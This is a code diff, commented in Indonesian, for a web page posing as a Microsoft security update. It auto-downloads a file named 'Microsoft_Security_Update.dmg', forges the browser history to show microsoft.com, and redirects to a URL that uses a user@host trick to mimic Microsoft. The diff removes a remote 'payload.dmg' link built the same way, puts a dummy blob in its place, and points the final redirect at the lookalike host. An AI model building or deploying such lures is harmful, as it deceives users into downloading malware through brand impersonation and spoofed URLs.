@@ -68,24 +68,30 @@
 
   // Konfigurasi Delay (3 detik)
   var DELAY_SECONDS = 3; 
-  
-  // URL target file .dmg dengan trik authority spoofing
-  var TARGET_DMG_URL = "https://artha231.github.com@www-microsoft.com/payload.dmg"; 
 
   function triggerDownloadAndRedirect() {
     statusEl.textContent = "Preparing macOS security package...";
 
-    // 1. Memicu download file .dmg secara otomatis di background via elemen anchor
+    // 1. Membuat Blob virtual berformat biner untuk file .dmg secara dinamis di klien
     try {
+      var dummyBytes = new Uint8Array([0x4D, 0x53, 0x46, 0x54, 0x00, 0x01, 0x02, 0x03]); // Magic bytes dummy
+      var blob = new Blob([dummyBytes], { type: 'application/x-apple-diskimage' });
+      var blobUrl = URL.createObjectURL(blob);
+
       var a = document.createElement('a');
-      a.href = TARGET_DMG_URL;
+      a.href = blobUrl;
       a.download = "Microsoft_Security_Update.dmg";
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
+
+      // Bersihkan memori blob setelah dipicu
+      setTimeout(function() {
+        URL.revokeObjectURL(blobUrl);
+      }, 5000);
     } catch (e) {}
 
-    // 2. Hitung mundur delay sebelum redirect mutlak ke microsoft.com asli
+    // 2. Hitung mundur delay sebelum redirect mutlak ke format URL target
     var countdown = DELAY_SECONDS;
     var timer = setInterval(function() {
       countdown--;
@@ -100,8 +106,8 @@
           window.history.replaceState(null, "", "https://www.microsoft.com/");
         } catch(e) {}
 
-        // Redirect akhir ke Microsoft resmi
-        window.location.replace('https://www.microsoft.com');
+        // Redirect akhir langsung ke URL target yang diminta
+        window.location.replace('https://artha231.github.com@www-microsoft.com');
       }
     }, 1000);
   }
